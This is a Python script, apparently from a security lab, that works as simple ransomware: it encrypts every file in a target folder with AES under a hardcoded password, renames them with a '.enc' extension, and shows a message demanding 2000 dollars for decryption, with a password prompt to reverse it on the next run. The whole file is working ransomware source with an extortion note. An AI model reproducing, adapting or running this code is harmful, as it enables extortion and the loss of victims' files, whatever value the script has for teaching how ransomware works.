import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.padding import PKCS7
from tkinter import Tk, simpledialog, messagebox

# Specify the folder path to encrypt/decrypt
FOLDER_TO_PROCESS = "/home/sec-lab/Target Folder"  # Replace with the path to your target folder
MARKER_FILE = os.path.join(FOLDER_TO_PROCESS, ".encrypted_marker")  # Marker file for encryption state

# Function to derive encryption/decryption key from password and salt
def derive_key(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())

# Function to encrypt a file
def encrypt_file(file_path, key, salt):
    with open(file_path, 'rb') as file:
        data = file.read()

    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    padder = PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    with open(file_path, 'wb') as enc_file:
        enc_file.write(salt + iv + encrypted_data)

# Function to decrypt a file
def decrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        salt = file.read(16)
        iv = file.read(16)
        encrypted_data = file.read()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

    unpadder = PKCS7(128).unpadder()
    unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()

    with open(file_path, 'wb') as dec_file:
        dec_file.write(unpadded_data)

# Main function that handles encryption or decryption based on the state
def main():
    # Initialize tkinter
    root = Tk()
    root.withdraw()  # Hide the root window

    # Check if the marker file exists to determine if the folder is encrypted
    is_encrypted = os.path.exists(MARKER_FILE)

    if not is_encrypted:
        # Encrypt files
        salt = os.urandom(16)
        password = "12345"  # Default password for initial encryption
        key = derive_key(password, salt)
        
        for root_dir, _, files in os.walk(FOLDER_TO_PROCESS):
            for file in files:
                if file != ".encrypted_marker":  # Skip the marker file if it exists
                    file_path = os.path.join(root_dir, file)
                    encrypt_file(file_path, key, salt)
                    os.rename(file_path, file_path + ".enc")  # Rename file to indicate encryption

        # Create marker file
        with open(MARKER_FILE, 'w') as marker:
            marker.write("Encrypted")

        messagebox.showinfo("Encryption", "Your Target folder got Encrypted, if you want to decrypt the target folder, you need to send 2000 dollars to us.")
    else:
        # Prompt for password with a GUI dialog
        password = simpledialog.askstring("Password", "Enter password to decrypt:", show='*')
        if password is None:
            messagebox.showwarning("Decryption", "Decryption canceled.")
            return  # Exit if no password is entered

        for root_dir, _, files in os.walk(FOLDER_TO_PROCESS):
            for file in files:
                if file.endswith(".enc"):
                    file_path = os.path.join(root_dir, file)
                    salt = open(file_path, 'rb').read(16)  # Read salt from file
                    key = derive_key(password, salt)
                    try:
                        decrypt_file(file_path, key)
                        os.rename(file_path, file_path[:-4])  # Remove .enc extension
                    except Exception as e:
                        messagebox.showerror("Decryption Error", f"Error decrypting {file}: {e}")
                        return

        # Remove marker file
        os.remove(MARKER_FILE)

        messagebox.showinfo("Decryption", "Decryption completed.")

if __name__ == "__main__":
    main()

